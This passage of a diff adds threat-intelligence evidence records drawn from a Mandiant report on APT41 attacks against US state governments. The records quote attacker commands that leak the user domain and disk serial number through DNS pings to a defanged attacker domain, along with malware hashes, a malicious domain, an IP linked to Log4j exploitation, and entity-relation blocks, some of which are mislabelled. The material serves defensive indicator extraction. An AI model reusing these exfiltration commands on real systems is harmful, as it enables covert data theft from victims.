+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r3"
+      },
+      "text": "cmd.exe /c ping %userdomain%[.]ns[.]time12[.]cf",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_133",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r4"
+      },
+      "text": "ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+'.ns[.]time12[.]cf",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_135",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r2"
+      },
+      "text": "DSQUERY 49f1daea8a115dd6fce51a1328d863cf e85427af661fe5e853c8c9398dc46ddde50e2241 ebf28e56ae5873102b51da2cc",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_136",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r3"
+      },
+      "text": "DSQUERY b108b28138b93ec4822e165b82e41c7a 7056b044f97e3e349e3e0183311bb44b0bc3464f 062a7399100454c7a523a9382",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_137",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r4"
+      },
+      "text": "BADPOTATO 143278845a3f5276a1dd5860e7488313 6f6b51e6c88e5252a2a117ca1cfb57934930166b a4647fcb35c79f26354c34452e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_138",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r5"
+      },
+      "text": "In this last example, the command prints the length of the file syslog_6-1.dat, likely to ensure it has been fully written to disk prior to combining the multiple files into the full malicious executable.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_139",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r6"
+      },
+      "text": "ping -n 1 ((ls C:\\Users\\public\\syslog_6-1.dat).Length.ToString()+\"\".ns[.]time12[.]cf\"\")",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_141",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r8"
+      },
+      "text": "The CIDR blocks listed in Figure 16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious domain afdentry[.]workstation[.]eu[.]org.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_142",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r1"
+      },
+      "text": "Log4j (CVE-2021-44228) Exploitation 103[.]238[.]225[.]37",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_177",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule_backfill",
+        "sentence_id": "p6_rb177"
+      },
+      "text": "355b3ff61db44d18003537be8496eb03536e300f",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_178",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule_backfill",
+        "sentence_id": "p6_rb178"
+      },
+      "text": "SHA1 SHA256 KEYPLUG.LINUX 900ca3ee85dfc109baeed4888ccb5d39 355b3ff61db44d18003537be8496eb03536e300f e024ccc4c72eb5813cc2b6db7 KEYPLUG.LINUX b82456963d04f44e83442b6393face47 996aa69",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_179",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule_backfill",
+        "sentence_id": "p6_rb179"
+      },
+      "text": "996aa691bbc1250b571a2f5423a5d5e2da8317e6",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_180",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule_backfill",
+        "sentence_id": "p6_rb180"
+      },
+      "text": "5813cc2b6db7 KEYPLUG.LINUX b82456963d04f44e83442b6393face47 996aa691bbc1250b571a2f5423a5d5e2da8317e6 d7e8cc6c19ceebf0e125c9f18b DSQUERY 49f1daea8a115dd6fce51a1328d863cf e85427af661",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_58",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_malware_BEACON",
+        "ent_malware_Cobalt_Strike_BEACON",
+        "ent_malware_DUSTPAN"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_56",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_malware_DUSTPAN"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_39",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2021-44228"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_128",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_file_shell32.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_130",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_file_HealthService.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_36",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_cve_CVE-2020-0688",
+        "ent_cve_CVE-2021-44207"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_121",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_tool_Dsquery",
+        "ent_file_dsquery.dll",
+        "ent_tool_dsquery.dll",
+        "ent_file_dsquery.exe"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_44",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_campaign_State_Government_Campaign"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_34",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2021-44207"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_84",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_file_shell32.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_99",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_file_cmd.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_54",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_tool_Dsquery",
+        "ent_file_dsquery.dll",
+        "ent_tool_dsquery.dll",
+        "ent_file_dsquery.exe"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_129",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_file_msiexec.exe",
+        "ent_file_rundll32.exe",
+        "ent_file_S-1-5-18.dat",
+        "ent_file_shell32.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_20",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_Message_Authentication_Code",
+        "ent_threatactor_MAC"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_23",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_Message_Authentication_Code",
+        "ent_threatactor_MAC"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_112",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_campaign_State_Government_Campaign",
+        "ent_cve_CVE-2021-44207"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_124",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_tool_Dsquery",
+        "ent_file_dsquery.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_126",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_tool_Dsquery",
+        "ent_file_dsquery.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
